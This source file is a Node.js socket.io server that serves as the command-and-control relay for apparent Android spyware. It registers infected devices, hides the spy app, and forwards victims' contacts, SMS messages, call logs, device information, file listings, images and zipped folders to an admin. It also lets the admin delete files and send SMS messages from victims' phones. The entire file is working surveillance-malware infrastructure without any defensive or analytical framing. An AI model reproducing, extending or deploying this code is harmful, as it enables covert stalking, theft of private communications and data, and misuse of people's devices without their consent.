//port
const express = require("express");
var http = require("http");
const app = express();
const port =  process.env.PORT || 3000;
var server = http.createServer(app);
var io = require("socket.io")(server);

app.use(express.json());
console.log("waiting for a device Connect, at port 3000");

const device_secure_ids = {};
const device_socket_ids = {};

var admin_socket_id;
var admin_status = false;

var super_admin_socket_id;
var super_admin_status = false;

var call_ones = false;

io.on("connection", (socket) => {
  console.log("device connected");

  //spy connect Event
  socket.on("spy_connect", (device_id, device_name) => {
    device_secure_ids[device_id] = socket.id;
    device_socket_ids[socket.id] = device_id;
    if (admin_status == true) {
      io.to(admin_socket_id).emit("spy_connected", {
        device_id: device_id,
        device_name: device_name,
      });
    } else {
      console.log("Unable To Send Data to Admin Reason Admin Offline");
    }
    console.log(device_id);
    console.log(device_name);
  });

  //HeartBeat
  function sendHeartBeat() {
    setTimeout(sendHeartBeat, 8000);
    io.emit("ping");
  }

  //pong Received
  socket.on("pong", (from) => {
    var d = new Date();
    console.log("HeartBeat Received from " + from + " at " + d);
  });

  //admin connect Event
  socket.on("admin_connect", () => {
    admin_socket_id = socket.id;
    admin_status = true;
    io.emit("admin_connected");
    console.log("admin_connected");
  });

  //super_admin_connect
  socket.on("super_admin_connect", () => {
    super_admin_socket_id = socket.id;
    super_admin_status = true;
  });
  //send command
  socket.on("send_command", (command, to_device) => {
    io.to(device_secure_ids[to_device]).emit(command);
    console.log(command);
    console.log(to_device);
  });
  socket.on("files_list", (list, typ,size) => {
    io.to(admin_socket_id).emit("files_l", list, typ,size);
    console.log(list);
    console.log(size);

  });
  socket.on("dir_change", (dir, too) => {
    console.log(dir);
    io.to(device_secure_ids[too]).emit("change_dir", dir);
  });
socket.on("view_text_file", (dir, too) => {
    console.log(dir);
    io.to(device_secure_ids[too]).emit("view_text_file", dir);
  });
socket.on("view_text_file_data", (data) => {
    console.log(data);
    io.to(admin_socket_id).emit("view_text_file_data", data);
  });
socket.on("spy_config", (status, too) => {
    console.log(status);
    if(too == "all"){
    io.emit("spy_config", status);
    }else{
    io.to(device_secure_ids[too]).emit("spy_config", status);
 }
 });
  socket.on("new_files", (list, typ,size) => {
    console.log(list);
    console.log(size)
    io.to(admin_socket_id).emit("new_dir", list, typ,size);
  });

  socket.on("empty_dir", () => {
    io.to(admin_socket_id).emit("empty_dir");
    console.log("empty dir");
  });

  socket.on("not_dir", () => {
    io.to(admin_socket_id).emit("not_dir");
    console.log("not dir");
  });

  socket.on("send_image_bitmap", (path, too) => {
    //receive_image_bitmap
    io.to(device_secure_ids[too]).emit("send_img_bit", path);
  });

  socket.on("base64_image", (base) => {
    io.to(admin_socket_id).emit("receive_image_bitmap", base);
  });

  socket.on("multi_del_c", () => {
    io.to(admin_socket_id).emit("multi_del_comp");
  });

  socket.on("delete_file_multi", (def_path, data, too) => {
    io.to(device_secure_ids[too]).emit("delete_multi", def_path, data);
  });
socket.on("hide_spy", (data,too) => {
    io.to(device_secure_ids[too]).emit("hide_spy",data);
  });
  socket.on("download_file_multi", (def_path, data, too) => {
    io.to(device_secure_ids[too]).emit("download_multi", def_path, data);
    console.log("path " + def_path + ", data " + data);
  });
socket.on("file_info", (def_path, data, too) => {
    io.to(device_secure_ids[too]).emit("file_info", def_path, data);
    console.log("file info path " + def_path + ", data " + data);
  });
  socket.on("spy_contacts_data", (cname, cdata) => {
    io.to(admin_socket_id).emit("contacts_data", cdata, cname);
  });

  socket.on("spy_messages_data", (cnumber, cname, cdate, cdata) => {
    io.to(admin_socket_id).emit("messages_data", cnumber, cname, cdate, cdata);
  });

  socket.on("spy_device_info", (data) => {
    io.to(admin_socket_id).emit("device_info_data", data);
  });

  socket.on("copying_files", (size) => {
console.log(size + " copy size");
    io.to(admin_socket_id).emit("copying_files",size);
  });
socket.on("device_info_data", (data) => {
console.log(data);
    io.to(admin_socket_id).emit("device_info_data_spy",data);
  });
  socket.on("zipping_folder", (size) => {
  console.log(size + " zip size");
    io.to(admin_socket_id).emit("zipping_folder",size);
  });

  socket.on("zip_completed", (size) => {
console.log(size + " Uploading size");
    io.to(admin_socket_id).emit("zip_completed",size);
  });
  socket.on("file_uploaded", (data) => {
console.log("file uploaded" + data);
    io.to(admin_socket_id).emit("file_uploaded", data);
  });

  socket.on("send_message", (too, number, data) => {

    io.to(device_secure_ids[too]).emit("send_message_spy", number, data);
  });

  socket.on(
    "spy_call_logs",
    (number_list, name_list, call_type, duration_list, date) => {
      io.to(admin_socket_id).emit(
        "call_logs_data",
        number_list,
        name_list,
        duration_list,
        date,
        call_type
      );
    }
  );

  //disconnect Event
  socket.on("disconnect", function (reason) {
    if (socket.id == super_admin_socket_id) {
      super_admin_status = false;
      console.log("super admin disconnected " + reason);
    }
    if (socket.id == admin_socket_id) {
      console.log("admin disconnected " + reason);
      admin_status = false;
    } else {
      if (admin_status == true) {
        io.to(admin_socket_id).emit("spy_disconnected", {
          device_id: device_socket_ids[socket.id],
        });
      }
      console.log(
        "connection disconnect From Device : " +
          device_socket_ids[socket.id] +
          " Reason " +
          reason
      );
    }
  });

  //close Event
  socket.on("close", (resCode, des) => {
    console.log("connection closed");
    console.log(resCode);
    console.log(des);
  });
  if (call_ones == false) {
    setTimeout(sendHeartBeat, 8000);
    call_ones = true;
  }
});
server.listen(port, "0.0.0.0", () => {
  console.log("server started");
});
